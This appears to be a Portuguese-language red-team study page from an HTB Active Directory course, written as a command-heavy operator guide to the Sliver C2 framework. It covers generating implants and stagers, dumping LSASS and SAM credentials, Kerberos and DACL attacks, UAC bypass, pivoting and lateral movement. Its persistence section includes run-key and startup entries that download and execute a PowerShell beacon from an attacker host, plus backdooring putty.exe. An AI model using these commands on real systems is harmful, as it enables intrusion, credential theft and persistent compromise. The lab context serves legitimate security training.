---
layout: cyber
section: c2
title: "Sliver C2 — Framework de Comando e Controle"
---

# Sliver C2 — Framework de Comando e Controle

> **Módulo:** 02 - Infraestrutura C2  
> **Fonte:** HTB Active Directory Penetration Tester Path 2024, Módulo 13  
> **Tags:** `c2` `sliver` `bishopfox` `beacons` `sessions` `armory` `bof` `pivoting` `opsec`

---

## Sliver Como Alternativa Open-Source ao Cobalt Strike

Sliver é framework C2 open-source da BishopFox, escrito em Go. Surgiu como alternativa a Cobalt Strike e Metasploit com cinco diferenciais práticos: protocolo multi-canal nativo (mTLS, HTTP/S, DNS, WireGuard), obfuscação de binário via `garble` (randomiza symbols e strings em compile-time), arquitetura cliente-servidor com operadores separados do servidor via perfis, Armory (repositório de extensões .NET + BOFs pré-compiladas) e licença gratuita.

Em red team real, Sliver é usado pra manter persistência no ambiente-alvo, pivotar por segmentos de rede, exfiltrar credenciais e executar ferramentas ofensivas sem tocar disco (in-memory).

### Sliver vs Outros C2s

| Feature | Sliver | Cobalt Strike | Metasploit |
|---------|--------|---------------|------------|
| Custo | Gratuito | ~$3.500/ano | Gratuito |
| Linguagem | Go | Java | Ruby |
| Obfuscação | garble (nativa) | Manual | Limitada |
| Protocolos | mTLS, HTTP/S, DNS, WG | HTTP/S, DNS | HTTP, TCP |
| BOF support | Sim (coff-loader) | Nativo | Não |
| Armory | Sim | Não | Não |
| Multiplayer | Sim | Sim | Sim |
| Evasão AV | Moderada | Alta | Baixa |

---

## Arquitetura do Sliver

```
┌─────────────────────────────────────────────────────┐
│                    Red Team Infra                    │
│                                                     │
│  ┌──────────────┐    ┌──────────────────────────┐  │
│  │ sliver-client│    │     sliver-server         │  │
│  │  (operador)  │◄──►│  - multiplayer mode       │  │
│  └──────────────┘    │  - listener management    │  │
│                      │  - implant generation     │  │
│  ┌──────────────┐    └──────────┬───────────────┘  │
│  │ sliver-client│               │                   │
│  │  (operador2) │               │ C2 Channel        │
│  └──────────────┘               │                   │
└───────────────────────────────── │ ──────────────────┘
                                   │
                         ┌─────────▼──────────┐
                         │    Target Network   │
                         │                    │
                         │  ┌──────────────┐  │
                         │  │   Beacon/    │  │
                         │  │   Session    │  │
                         │  │  (implant)   │  │
                         │  └──────────────┘  │
                         └────────────────────┘
```

**Componentes:**
- **sliver-server**: processo central que gerencia listeners, implants e operadores
- **sliver-client**: CLI dos operadores; conecta ao server via mTLS com certificado específico
- **Beacon**: implant assíncrono — dorme por intervalos configuráveis e checa tarefas
- **Session**: implant síncrono — conexão persistente em tempo real (mais ruidoso)

---

## Instalação e Configuração

### Instalação do Servidor

```bash
# Download do servidor
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x ./sliver-server_linux

# Primeira execução (gera certificados, estrutura de diretórios)
./sliver-server_linux
```

Estrutura gerada em `~/.sliver/`:
```
~/.sliver/
├── certs/          # PKI interna (mTLS)
├── configs/        # configs de operadores
├── logs/           # logs do servidor
├── loot/           # dados exfiltrados
├── extensions/     # armory local
└── config/
    └── http-c2.json  # perfil de tráfego HTTP
```

### Instalação do Cliente

```bash
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
chmod +x ./sliver-client_linux

# Importar perfil de operador
./sliver-client_linux import student_10.10.14.193.cfg

# Conectar ao servidor
./sliver-client_linux
```

### Modo Multiplayer — Adicionando Operadores

No console do servidor:

```
[server] sliver > new-operator -n student -l 10.10.14.193
[server] sliver > multiplayer
```

Isso gera um arquivo `.cfg` que o operador importa com `sliver-client import`. Cada operador recebe certificado mTLS único — revogação é granular.

---

## Tipos de Implants: Beacons vs Sessions

### Beacons (Assíncronos) — Preferência em Red Team

Beacons dormem por um intervalo e "acordam" para checar tarefas no servidor. Comportamento similar ao Cobalt Strike Beacon.

**Vantagens:**
- Menos tráfego de rede → menor detecção por anomalia
- Simula tráfego legítimo com intervalo de jitter
- Melhor OPSEC para operações longas

**Desvantagens:**
- Latência entre comando e resposta
- Tarefas ficam em fila (`tasks`)

```
sliver > beacons           # listar beacons ativos
sliver (beacon) > tasks    # ver tarefas pendentes/concluídas
sliver (beacon) > interactive  # upgrade para session (mais ruidoso)
```

### Sessions (Síncronas) — Para Interatividade

Sessions mantêm conexão ativa em tempo real.

**Vantagens:**
- Resposta imediata a comandos
- Necessário para algumas operações (shell interativo)

**Desvantagens:**
- Conexão persistente é mais detectável
- Mais tráfego de rede

```
sliver > sessions          # listar sessions ativas
sliver > use <session-id>  # interagir com session
```

### Tabela Comparativa

| Aspecto | Beacon | Session |
|---------|--------|---------|
| Tipo | Assíncrono | Síncrono |
| Tráfego | Intermitente | Contínuo |
| Latência | Alta (por intervalo) | Baixa (imediata) |
| OPSEC | Melhor | Pior |
| Uso ideal | Persistência longa | Execução interativa |
| `interactive` | Sim → vira session | N/A |

---

## Gerando Implants

### Sintaxe Base

```bash
sliver > generate beacon [flags]  # beacon assíncrono
sliver > generate [flags]         # session
```

### Flags Essenciais

| Flag | Descrição |
|------|-----------|
| `--http <ip>` | Canal via HTTP |
| `--mtls <ip>` | Canal via mTLS (mais seguro) |
| `--https <ip>` | Canal via HTTPS |
| `--dns <domain>` | Canal via DNS |
| `--wg <ip>` | Canal via WireGuard |
| `--named-pipe <path>` | Named pipe (pivoting interno) |
| `-N <nome>` | Nome do implant |
| `--os windows/linux/mac` | SO alvo |
| `--arch amd64/386/arm64` | Arquitetura |
| `--format exe/shared/service/shellcode` | Formato de saída |
| `--skip-symbols` | **Desativa** obfuscação garble (build mais rápido, ~11MB) |
| `--timeout <sec>` | Timeout de conexão |
| `-i <ip:port>` | IP:porta para implants de pivoting |

### Exemplos Práticos

```bash
# Beacon HTTP simples (sem obfuscação — mais rápido para testes)
sliver > generate beacon --http 10.10.14.62 --skip-symbols -N http_beacon --os windows

# Beacon HTTP com obfuscação garble (~17MB, build demorado)
sliver > generate beacon --http 10.10.14.62 -N http_beacon_obfuscated --os windows

# Beacon mTLS (comunicação cifrada com certificado)
sliver > generate beacon --mtls 10.10.14.62 --skip-symbols -N mtls_beacon --os windows

# Session shellcode (para injeção via stager)
sliver > generate --http 10.10.14.62 --format shellcode --skip-symbols -N payload_shellcode --os windows

# Named pipe implant (para pivoting interno via TCP pivot)
sliver > generate --named-pipe 10.10.14.62/pipe/academy -N pipe_academy --skip-symbols

# Service format (necessário para psexec lateral movement)
sliver > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

# Beacon com intervalo personalizado (60s ± 20% jitter)
sliver > generate beacon --http 10.10.14.62 --seconds 60 --jitter 20 -N stealthy_beacon --os windows
```

### Obfuscação com Garble

Sem `--skip-symbols`, Sliver compila com `garble`, que:
- Randomiza nomes de funções e variáveis Go
- Remove strings identificáveis do binário
- Gera binários maiores (~17MB vs ~11MB)
- Aumenta tempo de build (~3-5min vs ~30seg)

```
# Verificar se obfuscação está ativa — ausência de --skip-symbols = obfuscação ON
sliver > generate beacon --http 10.10.14.62 -N beacon_obf --os windows
# [*] Garble: enabled
```

---

## Listeners e Profiles

### Iniciando Listeners

```bash
# HTTP listener na porta padrão (80)
sliver > http

# HTTP em porta customizada e interface específica
sliver > http -L 10.10.14.62 -l 9001

# HTTP para profile de stager (porta 8088)
sliver > http -L 10.10.14.62 -l 8088

# HTTPS listener
sliver > https

# mTLS (mutual TLS — mais seguro)
sliver > mtls

# DNS listener
sliver > dns

# WireGuard listener
sliver > wg

# Listar listeners ativos
sliver > jobs

# Matar listener
sliver > jobs -k <job-id>
```

### Profiles (para Stagers)

Profiles permitem gerar stagers pequenos que baixam o implant completo em memória.

```bash
# Criar profile baseado em HTTP
sliver > profiles new --http 10.10.14.62:8088 --format shellcode htb

# Criar stage-listener TCP que entrega o shellcode do profile
sliver > stage-listener --url tcp://10.10.14.62:4443 --profile htb

# Listener HTTP que serve o implant
sliver > http -L 10.10.14.62 -l 8088

# Gerar stager C# que conecta ao stage-listener
sliver > generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
```

**Fluxo de stager:**
1. Stager (`staged.txt`) é entregue ao alvo (pequeno, ~5KB)
2. Stager conecta em `10.10.14.62:4443` (TCP stage-listener)
3. Stage-listener entrega shellcode do implant completo em memória
4. Implant executa e conecta ao listener HTTP em `10.10.14.62:8088`

### Tabela de Listeners

| Protocolo | Porta Padrão | Vantagem | Desvantagem |
|-----------|-------------|----------|-------------|
| HTTP | 80 | Comum, passa firewalls | Sem criptografia |
| HTTPS | 443 | Cifrado, comum | Inspeção SSL corporativa |
| mTLS | 8888 | Autenticação mútua | Porta não-padrão |
| DNS | 53 | Bypassa muitos firewalls | Lento, limitações de tamanho |
| WireGuard | 51820 (UDP) | Moderno, cifrado | Menos comum |
| Named Pipe | N/A | Sem tráfego de rede | Apenas local/SMB |
| TCP Pivot | Customizável | Flexível para pivoting | Depende de acesso rede |

---

## Comandos de Pós-Exploração

### Navegação e Sistema de Arquivos

```bash
sliver (session) > pwd                          # diretório atual
sliver (session) > ls                           # listar arquivos
sliver (session) > ls C:\\Users\\eric\\Desktop  # listar path específico
sliver (session) > cd C:\Users                  # mudar diretório
sliver (session) > cat academy.txt              # ler arquivo
sliver (session) > download Pictures            # baixar arquivo/diretório
sliver (session) > upload academy.txt C:/Users/eric/Desktop/academy.txt  # upload
sliver (session) > mkdir C:\Temp\tools          # criar diretório
sliver (session) > rm C:\Temp\tools\file.txt    # remover arquivo
```

### Informações do Sistema

```bash
sliver (session) > info          # info do implant (hostname, user, OS, PID)
sliver (session) > ifconfig      # interfaces de rede
sliver (session) > netstat       # conexões de rede ativas
sliver (session) > ps            # listar processos
sliver (session) > ps -e lsass   # filtrar processo por nome
sliver (session) > getprivs      # listar privilégios do token atual
sliver (session) > getuid        # usuário atual
sliver (session) > getgids       # grupos do usuário atual
sliver (session) > env           # variáveis de ambiente
sliver (session) > screenshot    # capturar screenshot
```

### Execução de Comandos

```bash
# Executar comando e retornar saída
sliver (session) > execute -o cmd /c whoami /all

# PowerShell sem janela
sliver (session) > execute -o powershell -nop -w hidden -c "Get-Process"

# Executar com saída detalhada
sliver (session) > execute -o powershell $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# EVITAR: shell interativa (péssimo OPSEC — abre cmd.exe filho)
sliver (session) > shell   # BAD OPSEC
```

### Gerenciamento de Processos

```bash
sliver (session) > ps                    # listar todos processos
sliver (session) > ps -e explorer.exe    # filtrar por nome
sliver (session) > procdump --pid 660 --save /tmp/lsass.dmp  # dump de processo
sliver (session) > terminate --pid 1234  # matar processo
```

### Credenciais e Hashes

```bash
sliver (session) > hashdump              # dump de hashes SAM (requer SYSTEM)
sliver (session) > procdump --pid 660 --save /tmp/lsass.dmp  # dump LSASS para pypykatz

# Após download do dump, parsear localmente
pypykatz lsa minidump lsass.dmp
```

### Registry (Windows)

```bash
sliver (session) > registry read --hive HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion" ProductName
sliver (session) > registry write --hive HKCU "Software\Classes\ms-settings\shell\open\command" ""
sliver (session) > registry delete --hive HKCU "Software\Classes\ms-settings\shell\open\command"
sliver (session) > registry list --hive HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

### Token Manipulation

```bash
# Criar token com credenciais conhecidas
sliver (session) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!

# Impersonar usuário logado (se processo disponível)
sliver (session) > impersonate

# Reverter para token original
sliver (session) > rev2self

# Executar processo como outro usuário
sliver (session) > runas -u administrator -p Password123! -e powershell.exe
```

### Execute-Assembly (Executar .NET em Memória)

```bash
# Executar .NET assembly sem escrever no disco
sliver (session) > execute-assembly Seatbelt.exe -group=system
sliver (session) > execute-assembly /path/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
sliver (session) > execute-assembly /path/SharpUp.exe audit
```

### Inline Execute Assembly (via Armory)

```bash
# Rubeus — Kerberoasting
sliver (session) > inline-execute-assembly /path/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'

# Rubeus — ASREPRoasting
sliver (session) > inline-execute-assembly /path/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'

# Rubeus — Pass-the-Ticket
sliver (session) > inline-execute-assembly /path/Rubeus.exe 'ptt /ticket:BASE64TICKET'
```

---

## Escalação de Privilégios

### Verificar Privilégios

```bash
sliver (session) > getprivs           # listar privilégios do token
sliver (session) > getsystem          # tentar escalar para SYSTEM automaticamente
```

### GodPotato (SeImpersonatePrivilege)

Quando o implant roda como usuário de serviço com `SeImpersonatePrivilege`:

```bash
# Gerar shellcode do implant SYSTEM
# (gerar beacon com mtls, salvar como .bin via donut)

# Executar GodPotato injetando shellcode do novo beacon
sliver (session) > execute-shellcode -p <pid-do-godpotato> /home/htb-ac590/godpotato.bin

# Alternativa: usar via armory
sliver (session) > sharpup -- audit   # verificar vetores de privesc
```

### Verificação de Vetores com SharpUp

```bash
sliver (session) > sharpup -- audit
# Verifica: Unquoted Service Paths, AlwaysInstallElevated,
#           ModifiablePaths, ModifiableServices, etc.
```

### UAC Bypass

Via fodhelper (HKCU registry trick):

```bash
sliver (session) > registry write --hive HKCU "Software\Classes\ms-settings\shell\open\command" "powershell.exe -enc BASE64CMD"
sliver (session) > registry write --hive HKCU "Software\Classes\ms-settings\shell\open\command" DelegateExecute ""
sliver (session) > execute -o cmd /c fodhelper.exe
sliver (session) > registry delete --hive HKCU "Software\Classes\ms-settings\shell\open\command"
```

---

## Reconhecimento de Domínio

### Seatbelt — Enumeração de Sistema

```bash
# Via armory (instalado)
sliver (session) > seatbelt -- -group=system
sliver (session) > seatbelt -- -group=all
sliver (session) > seatbelt -- -group=user
sliver (session) > seatbelt -- DotNetVersion OSVersion PowerShell
```

### SharpView / PowerView

```bash
# SharpView (C# port do PowerView)
sliver (session) > sharpview -- Get-Domain
sliver (session) > sharpview -- Get-DomainUser -Identity alice
sliver (session) > sharpview -- Get-DomainGroupMember -Identity "Domain Admins"
sliver (session) > sharpview -- Get-DomainController
sliver (session) > sharpview -- Get-DomainTrust

# PowerView via sharpsh (executa PS1 em memória)
sliver (session) > sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c BASE64'
```

### BloodHound / SharpHound

```bash
# Coletar dados para BloodHound
sliver (session) > sharp-hound-4 -- -c All --zipfilename academy

# Download do zip gerado
sliver (session) > download academy_TIMESTAMP_BloodHound.zip

# Ingestão no BloodHound local
neo4j start
bloodhound
# Upload do zip na UI
```

### BOFs de Reconhecimento

```bash
sliver (session) > c2tc-domaininfo            # informações gerais do domínio
sliver (session) > c2tc-psloggedon           # usuários logados em hosts
sliver (session) > delegationbof 6 child.htb.local  # enumerar delegação Kerberos
```

---

## Ataques Kerberos

### Kerberoasting

```bash
# Via Rubeus (inline)
sliver (session) > inline-execute-assembly /path/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'

# Via BOF c2tc-kerberoast
sliver (session) > c2tc-kerberoast roast alice

# Via bof-roast
sliver (session) > bof-roast rdp/web01.child.htb.local

# Crack offline
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### ASREPRoasting

```bash
# Via Rubeus
sliver (session) > inline-execute-assembly /path/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'

# Crack offline
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Delegação Kerberos — Unconstrained

Quando um host tem delegação irrestrita, qualquer ticket de qualquer usuário que autentica nele fica em memória:

```bash
# Enumerar hosts com unconstrained delegation
sliver (session) > sharpview -- Get-DomainComputer -Unconstrained

# Listar tickets em memória (requer acesso SYSTEM no host)
sliver (session) > inline-execute-assembly /path/Rubeus.exe 'dump /nowrap'

# Coerção de autenticação (Printerbug/PetitPotam do DC)
# (executar de outro implant na rede)
sliver (session) > execute -o python3 printerbug.py child.htb.local/svc_sql:jkhnrjk123!@dc01.child.htb.local web01.child.htb.local

# Capturar ticket do DC após coerção
sliver (session) > inline-execute-assembly /path/Rubeus.exe 'monitor /interval:5 /nowrap'

# DCSync com ticket do DC$
secretsdump.py -k -no-pass dc01.child.htb.local
```

### Delegação Kerberos — Constrained

```bash
# Enumerar delegação constrained
sliver (session) > delegationbof 6 child.htb.local

# S4U2Self + S4U2Proxy com Rubeus
sliver (session) > inline-execute-assembly /path/Rubeus.exe 's4u /user:svc_sql /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc01.child.htb.local /nowrap'
```

---

## Pivoting e Tunelamento

### SOCKS5 Proxy

```bash
# Iniciar proxy SOCKS5 na porta 1080 (tráfego passa pelo implant)
sliver (session) > socks5 start -P 1080

# Listar proxies ativos
sliver (session) > socks5

# Parar proxy
sliver (session) > socks5 stop -i <id>

# Usar com proxychains (editar /etc/proxychains4.conf)
# socks5 127.0.0.1 1080
proxychains4 nmap -sT -p 80,443,445 172.16.1.0/24
proxychains4 secretsdump.py child.htb.local/admin:Password123!@172.16.1.10
```

### Port Forwarding

```bash
# Forward local:8080 → remoto:8080 (via implant)
sliver (session) > portfwd add -r 172.16.1.10:8080

# Reverse port forward (bind no alvo, forward para attacker)
sliver (session) > rportfwd add -b 8080 -r 127.0.0.1:8080

# Listar forwards ativos
sliver (session) > portfwd
sliver (session) > rportfwd
```

### TCP Pivot Listener

Para pivotar para segmentos sem acesso direto:

```bash
# No implant já comprometido (web01 → acesso interno)
sliver (session) > pivots tcp --bind 172.16.1.11

# Listar pivots ativos
sliver (session) > pivots

# Gerar implant que conecta via pivot TCP
sliver > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot
```

### Named Pipe Pivot

```bash
# Criar named pipe pivot listener
sliver (session) > pivots named-pipe --bind academy

# Gerar implant que usa named pipe
sliver > generate --named-pipe 10.10.14.62/pipe/academy -N pipe_academy --skip-symbols

# Implantar via psexec
sliver (session) > psexec --custom-exe /path/pipe_academy.exe srv02.child.htb.local
```

### Chisel (Extensão para Tunelamento)

Chisel provê SOCKS5 reverso quando SOCKS5 nativo não é suficiente:

```bash
# Setup: clonar e compilar extensão Chisel
git clone https://github.com/MrAle98/chisel
mkdir ~/.sliver-client/extensions/chisel
cp extension.json ~/.sliver-client/extensions/chisel
make windowsdll_64
make windowsdll_32

# No attacker: iniciar server chisel com SOCKS5 reverso
chisel server --reverse -p 1337 -v --socks5

# No implant: conectar ao server e criar túnel reverso
sliver (session) > chisel client 10.10.14.62:1337 R:socks

# Agora proxychains usa porta 1080 (padrão do chisel) do attacker
```

---

## Movimento Lateral

### PsExec

```bash
# Gerar implant em formato service (SVCHost wrapper)
sliver > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

# Executar psexec lateral movement
sliver (session) > psexec \
  --custom-exe /path/psexec-pivot.exe \
  --service-name Teams \
  --service-description MicrosoftTeaams \
  srv01.child.htb.local
```

### WMIC

```bash
# Executar processo remoto via WMIC (requer credenciais)
sliver (session) > execute -o wmic \
  /node:172.16.1.13 \
  /user:svc_sql \
  /password:jkhnrjk123! \
  process call create \
  "C:\\windows\\tasks\\wmicpivot.exe"
```

### Certify (ADCS Abuse)

```bash
# Enumerar templates vulneráveis (ESC1-ESC8)
sliver (session) > certify -- find

# Requisitar certificado vulnerável
sliver (session) > certify -- request /ca:ca01.child.htb.local\child-CA01 /template:VulnTemplate /altname:administrator

# Usar certificado para obter TGT
sliver (session) > inline-execute-assembly /path/Rubeus.exe 'asktgt /user:administrator /certificate:BASE64CERT /password:CERTPASS /nowrap'
```

---

## Persistência

### Scheduled Task

```bash
# Criar task que executa beacon PowerShell encoded a cada 1 minuto
sliver (beacon) > execute -o powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr "powershell.exe -enc BASE64ENCODEDBEACON" /ru SYSTEM'

# Verificar task criada
sliver (beacon) > execute -o powershell 'schtasks /query /tn SecurityUpdater'
```

### Startup Folder (via SharpersistExt)

```bash
sliver (beacon) > sharpersist -- \
  -t startupfolder \
  -c "powershell.exe" \
  -a "-nop -w hidden iex(New-Object Net.WebClient).DownloadString('http://10.10.14.62/beacon.ps1')" \
  -f "Edge Updater" \
  -m add
```

### Registry Run Keys

```bash
# HKLM\Run (requer admin, persiste para todos usuários)
sliver (beacon) > sharpersist -- \
  -t reg \
  -c "powershell.exe" \
  -a "-nop -w hidden iex(New-Object Net.WebClient).DownloadString('http://10.10.14.62/b.ps1')" \
  -k "hklmrun" \
  -v "AdvancedProtection" \
  -m add

# HKCU\Run (usuário atual, não requer admin)
sliver (beacon) > sharpersist -- \
  -t reg \
  -c "powershell.exe" \
  -a "-nop -w hidden iex(New-Object Net.WebClient).DownloadString('http://10.10.14.62/b.ps1')" \
  -k "hkcurun" \
  -v "ChromeUpdate" \
  -m add
```

### Backdoor em Binário Legítimo

```bash
# Injetar shellcode do beacon em executável legítimo existente
sliver (beacon) > backdoor \
  --profile persistence-shellcode \
  "C:\Program Files\PuTTY\putty.exe"

# O profile deve ser criado previamente
sliver > profiles new --http 10.10.14.62:8088 --format shellcode persistence-shellcode
```

---

## Armory e BOFs

### O que é Armory

Armory é o gerenciador de extensões do Sliver. Distribui:
- **.NET assemblies**: Seatbelt, SharpUp, SharpView, SharpHound, Rubeus, Certify, etc.
- **BOFs (Beacon Object Files)**: executados via `coff-loader` sem spawnar processos
- **Extensões nativas Go**: chisel, etc.

BOFs são fragments de código C compilados em formato COFF. Rodam no contexto do processo do implant — sem fork, sem filho, sem rastro de processo.

### Gerenciamento do Armory

```bash
# Instalar extensão específica
sliver > armory install seatbelt
sliver > armory install sharpup
sliver > armory install rubeus
sliver > armory install certify
sliver > armory install sharp-hound-4
sliver > armory install nanodump
sliver > armory install sharpersist
sliver > armory install sharpsh

# Instalar tudo
sliver > armory install all

# Pesquisar extensão
sliver > armory search kerberoast

# Atualizar extensões
sliver > armory update

# Listar instaladas
sliver > armory
```

### Extensões do Armory

| Extensão | Tipo | Função |
|----------|------|--------|
| `seatbelt` | .NET | Enumeração defensiva/ofensiva do sistema |
| `sharpup` | .NET | Enumeração de vetores de privesc |
| `sharpview` | .NET | Recon de AD (port C# do PowerView) |
| `rubeus` | .NET | Ataques Kerberos (kerberoast, asreproast, ptt, s4u) |
| `certify` | .NET | Enumeração e abuso de ADCS |
| `nanodump` | BOF | Dump de LSASS in-memory sem procdump |
| `sharp-hound-4` | .NET | Coleta de dados para BloodHound |
| `sharpersist` | .NET | Persistência (startup, registry, task) |
| `sharpsh` | .NET | Executa scripts PowerShell em memória |
| `inline-execute-assembly` | BOF | Executa .NET sem spawnar processo |
| `c2tc-domaininfo` | BOF | Info do domínio AD |
| `c2tc-kerberoast` | BOF | Kerberoasting via BOF |
| `delegationbof` | BOF | Enumera Kerberos delegation |
| `bof-roast` | BOF | Kerberoasting via SPN |
| `chisel` | Go ext | Tunelamento SOCKS5 via extensão |

### Nanodump — Dump LSASS sem Procdump

```bash
# Dump LSASS in-memory (PID, output, pid-fork, method)
sliver (session) > nanodump 656 web01-lsass 1 PMDM

# PMDM = Process Memory Dump Method
# 1 = fork process (evita crash do LSASS)

# Download e análise
sliver (session) > download web01-lsass
pypykatz lsa minidump web01-lsass
```

---

## Credential Dumping

### Dump via Procdump (Básico)

```bash
# Identificar PID do LSASS
sliver (session) > ps -e lsass

# Dump
sliver (session) > procdump --pid 660 --save /tmp/lsass.dmp

# Analisar localmente
pypykatz lsa minidump /tmp/lsass.dmp
```

### PPL Bypass (Protected Process Light)

Windows protege LSASS com PPL — bloqueia acesso de processos não-assinados:

```bash
# Verificar se PPL está ativo
sliver (session) > execute -o powershell 'Get-Process lsass | Select-Object -Property Name,Id,@{n="PPL";e={$_.MainModule.FileVersionInfo}}'

# Método: PPLdump (BOF) para remover proteção PPL
sliver (session) > execute-assembly /path/PPLdump.exe 660 /tmp/lsass_ppl.dmp

# Ou: usar nanodump com método PMDM que contorna PPL
sliver (session) > nanodump 660 lsass_dump 1 PMDM
```

### HashdumpExt (SAM)

```bash
# Dump hashes locais da SAM (requer SYSTEM)
sliver (session) > hashdump
```

---

## DACL Abuse

### Enumeração com BloodHound

```bash
# Coletar dados
sliver (session) > sharp-hound-4 -- -c All --zipfilename academy

# No BloodHound: procurar paths de ForceChangePassword, WriteDACL, etc.
# Cypher query: find principals with ForceChangePassword on privileged users
```

### ForceChangePassword

Quando um principal tem `ForceChangePassword` sobre outro usuário AD:

```bash
# Com credenciais do principal que tem o direito
sliver (session) > make-token -u attacker_user -d child.htb.local -p Password123!

# Alterar senha via PowerView em memória
sliver (session) > sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c BASE64_SET_PASSWORD'

# Base64 do comando PowerView:
# Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

### WriteDACL / WriteOwner

```bash
# Via PowerView em memória
# Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity attacker_user -Rights DCSync

sliver (session) > sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c BASE64_ADD_DACL'

# Após adicionar DCSync rights: secretsdump
secretsdump.py child.htb.local/attacker_user:Password123!@dc01.child.htb.local
```

---

## Evasão e OPSEC

### Princípios de OPSEC com Sliver

| Prática | Risco | Alternativa Segura |
|---------|-------|--------------------|
| `shell` interativo | Alto — spawna `cmd.exe` filho | `execute -o cmd /c <cmd>` |
| `execute-assembly` | Médio — spawna processo | `inline-execute-assembly` (BOF) |
| Escrever ferramentas no disco | Alto — detecção AV | Armory (in-memory) |
| Sem `--skip-symbols` em build | Build lento, maior binário | Usar em produção; `--skip-symbols` só em testes |
| Beacons com intervalo muito curto | Padrão anômalo | ≥60s com jitter |
| Upload de binário assinado MZ | Detecção por hash | Compilar na hora |

### Obfuscação de Tráfego HTTP

Editar `~/.sliver/config/http-c2.json` para personalizar URIs, headers e cookies:

```json
{
  "implant_config": {
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "headers": [
      {"name": "Accept", "value": "text/html,application/xhtml+xml"},
      {"name": "Accept-Language", "value": "en-US,en;q=0.9"}
    ],
    "url_parameters": [],
    "path_files": ["jquery.js", "bootstrap.min.js"],
    "path_directories": ["assets", "js", "static"]
  },
  "server_config": {
    "random_version_headers": true,
    "headers": [
      {"name": "Server", "value": "nginx/1.18.0"}
    ]
  }
}
```

### Beacon Sleep e Jitter

```bash
# Alterar sleep de beacon ativo (60s com 25% jitter)
sliver (beacon) > sleep 60s
sliver (beacon) > sleep 60s 25

# Na geração: --seconds e --jitter
sliver > generate beacon --http 10.10.14.62 --seconds 120 --jitter 30 -N stealthy --os windows
```

### Evitar Shell Filho (Command Execution OPSEC)

```bash
# RUIM — spawna cmd.exe
sliver (session) > shell
sliver (session) > execute cmd /c whoami

# BOM — execute com -o (retorna output sem shell pai)
sliver (session) > execute -o powershell -nop -c "whoami /all"

# MELHOR — via BOF (sem processo filho)
sliver (session) > c2tc-domaininfo   # BOF, sem spawn
```

### Donut — Shellcode de .NET Assemblies

Para injetar .NET assemblies em processos existentes via shellcode:

```bash
# Gerar shellcode a partir de .NET DLL
donut -a 2 -f 1 -i Rubeus.exe -p "kerberoast /nowrap" -o rubeus_shellcode.bin

# Injetar no processo alvo
sliver (session) > execute-shellcode -p <pid> /path/rubeus_shellcode.bin
```

---

## Multiplayer e Gestão de Operadores

### Setup Multiplayer

```bash
# No servidor — adicionar operador e ativar multiplayer
[server] sliver > new-operator -n alice -l 10.10.14.62
[server] sliver > new-operator -n bob -l 10.10.14.62
[server] sliver > multiplayer

# Cada operador recebe arquivo .cfg
# alice_10.10.14.62.cfg
# bob_10.10.14.62.cfg
```

### Gestão de Operadores

```bash
# Listar operadores conectados
sliver > operators

# Revogar operador (remove certificado)
[server] sliver > kick-operator -n bob

# Reimportar config (operador)
./sliver-client_linux import alice_10.10.14.62.cfg
```

### Sessões Compartilhadas

Todos os operadores veem os mesmos beacons/sessions. Um operador pode `use` uma session que outro abriu. Coordenação via canais externos (chat de equipe) é necessária para evitar conflito de tarefas.

---

## Attack Lifecycle — Cyber Kill Chain com Sliver

Mapeamento das fases de um engajamento real usando Sliver:

| Fase | Ação | Ferramenta Sliver |
|------|------|-------------------|
| 1. Reconhecimento | N/A (externo) | — |
| 2. Weaponization | Gerar beacon HTTP com garble | `generate beacon --http` |
| 3. Delivery | Entregar via phishing/exploit | stager / shellcode |
| 4. Exploitation | Executar implant no alvo | beacon/session establece |
| 5. Installation | Persistência via registry/task | `sharpersist`, `backdoor` |
| 6. C2 | Manter canal ativo | Beacons + listeners |
| 7. Actions on Objectives | Dump creds, lateral movement, DCSync | Armory, psexec, secretsdump |

---

## Módulos Relacionados

| Conceito | Módulo |
|----------|--------|
| BloodHound / SharpHound | `09_active_directory/08_bloodhound_e_enumeracao.md` |
| Kerberoasting / ASREPRoasting | `09_active_directory/02_kerberoasting_e_asrep.md` |
| ADCS (Certify) | `09_active_directory/10_adcs_attacks.md` |
| Pass-the-Hash / Pass-the-Ticket | `08_movimentacao_lateral/01_lateral_movement_windows.md` |
| DCSync | `09_active_directory/04_dcsync_e_dominancia.md` |
| Proxychains + SOCKS | `08_movimentacao_lateral/03_pivoting_e_tunelamento.md` |

---

## Leitura Complementar

- Sliver Wiki Oficial — https://github.com/BishopFox/sliver/wiki
- Sliver Armory — https://github.com/BishopFox/sliver-armory
- garble (obfuscação Go) — https://github.com/mvdan/garble
- Donut (shellcode de .NET) — https://github.com/TheWover/donut
- nanodump — https://github.com/helpsystems/nanodump
- Chisel MrAle98 extension — https://github.com/MrAle98/chisel
- HTB AD Penetration Tester Path 2024 — Módulo 13 (Intro to C2 Operations with Sliver)
